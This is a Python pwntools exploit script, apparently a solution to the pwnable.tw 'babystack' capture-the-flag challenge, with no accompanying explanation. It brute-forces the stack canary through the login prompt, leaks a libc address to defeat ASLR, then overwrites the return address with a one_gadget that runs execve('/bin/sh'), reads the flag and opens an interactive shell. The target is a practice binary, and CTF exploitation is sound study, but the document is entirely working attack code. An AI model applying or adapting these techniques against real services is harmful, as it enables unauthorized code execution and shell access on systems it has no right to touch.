from pwn import *

#p = process("./babystack", env = {"LD_PRELOAD":"./libc_64.so.6"})
p = remote("chall.pwnable.tw",10205)
libc = ELF("./libc_64.so.6")

def login(passwd):
	p.sendafter(">> ","1")
	p.sendafter("Your passowrd :",passwd)

def logout():
	p.sendafter(">> ","1")

cookie = ""
for i in range(0x10):
	for j in range(1,0x100):
		if j == 0xa:
			continue

		login(cookie+chr(j)+"\n")
		if "Login Success !" in p.recvline():
			cookie += chr(j)
			print hex(j)
			logout()
			break

print cookie.encode("hex")
login("1"*0x50)
login(cookie + "\n")
p.sendafter(">> ","3")
p.sendafter("Copy :","1"*0x18)
logout()
stdout = ""
for i in range(0x4):
	for j in range(1,0x100):
		if j == 0xa:
			continue

		login("1"*0x11 + stdout+chr(j)+"\n")
		if "Login Success !" in p.recvline():
			stdout += chr(j)
			print hex(j)
			logout()
			break

stdout = "\x20" + stdout + "\x7f"
libc.address = u64(stdout.ljust(8,"\x00")) - libc.sym["_IO_2_1_stdout_"]
print hex(libc.address)
'''
0xef6c4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0567	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one = 0xf0567  + libc.address
print hex(one)
login("1"*0x40 + cookie + "1"*0x18 + p64(one))
login("111\n")
p.sendafter(">> ","3")
p.sendafter("Copy :","1"*0x18)
p.sendafter(">> ","2")
p.sendline("cat /home/babystack/flag")
print p.recvuntil("}")
p.interactive()
